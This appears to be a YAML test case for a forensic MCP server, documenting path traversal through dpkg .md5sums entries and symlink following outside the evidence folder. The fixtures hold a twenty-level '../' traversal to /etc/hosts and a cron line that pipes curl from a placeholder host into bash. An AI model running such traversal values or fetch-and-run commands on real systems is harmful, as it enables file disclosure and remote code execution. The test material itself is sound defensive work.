# Matrix case P2066-002: verify_package_integrity joins each .md5sums path to
# the root without checking that the result stays inside the evidence
# directory, so "../" lines hash files outside it.
# find_persistence follows a symlink inside the evidence without checking
# where it points: fs/etc/crontab is an absolute link (common in mounted
# images) to a file in ${OUTSIDE}, a folder the server is not given, and its
# content is returned as the cron sample.
case_id: P2066-002
problem: P2066
server: findevil
variant: findevil-d1a8d25
commit: d1a8d25d9c8c05bd66881506cb1f12314ee7c5e1
display: side-effect
level: mcp
realism: possible
realism_ko: "마운트한 이미지 안의 절대 경로 심볼릭 링크는 흔하다. `../`를 스무 번 쓴 `.md5sums` 줄은 공격자가 일부러 심어야 생긴다."
coverage: full
summary: A dpkg .md5sums line pointing to ../../(x20)etc/hosts makes the server open and hash /etc/hosts on the host, outside the evidence directory, and report its MD5 as a modified package file, and find_persistence returns the content of a file outside the evidence that fs/etc/crontab links to.
summary_ko: "dpkg `.md5sums` 줄이 `../../`(x20)`etc/hosts`를 가리키면, 서버는 증거 폴더 밖 호스트의 `/etc/hosts`를 해시해 수정된 패키지 파일로 보고한다. `find_persistence`도 `fs/etc/crontab` 링크가 가리키는 증거 밖 파일의 내용을 돌려준다."
defect_ko: "이 서버는 링크와 `.md5sums` 경로가 증거 폴더 밖을 가리켜도 따라가 읽는다. 밖을 가리키면 읽지 않아야 한다. 모델은 분석 호스트의 `/etc/hosts`와 밖의 파일 내용을 증거로 잘못 안다."
setup_ko: "`../`로 호스트 `/etc/hosts`를 가리키는 `.md5sums` 줄과, 서버에 주지 않은 폴더의 파일로 이어지는 `etc/crontab` 링크를 두었다."
fixture:
  - path: fs/var/lib/dpkg/info/evil.md5sums
    text: "00000000000000000000000000000000  ../../../../../../../../../../../../../../../../../../../../etc/hosts\n"
  - path: crontab
    root: outside
    # a download line, so the finding is listed (info-level cron files are
    # only counted); the marker shows the text came from ${OUTSIDE}
    text: "*/5 * * * * root curl -s http://198.51.100.20/OUTSIDE-THE-EVIDENCE-FOLDER.sh | bash\n"
  - path: fs/etc/crontab
    symlink: ${OUTSIDE}/crontab
steps:
  - tool: verify_package_integrity
    note_ko: "결함 호출: 패키지 무결성 검사"
    args:
      root_path: ${EVIDENCE}/fs
  - tool: find_persistence
    note_ko: "결함 호출: 지속성 검사"
    args:
      root_path: ${EVIDENCE}/fs
expect:
  - step: 1
    note_ko: "경로 하나를 비교한 것으로 센다"
    contains: "**Files compared:** 1"
  - step: 1
    note_ko: "그 파일이 없다고 하지 않는다"
    contains: "**Missing files (recorded by dpkg, not on disk):** 0"
  # the actual MD5 column proves the file outside the evidence dir was read
  - step: 1
    note_ko: "증거 밖 `/etc/hosts`의 실제 MD5가 나온다"
    regex: "\\| `evil` \\| `/(\\.\\./){20}etc/hosts` \\| `0{32}` \\| `[0-9a-f]{32}` \\|"
  # the cron sample is the content of the file outside ${EVIDENCE}
  - step: 2
    note_ko: "증거 밖 파일의 cron 내용이 결과에 나온다"
    contains: "OUTSIDE-THE-EVIDENCE-FOLDER"
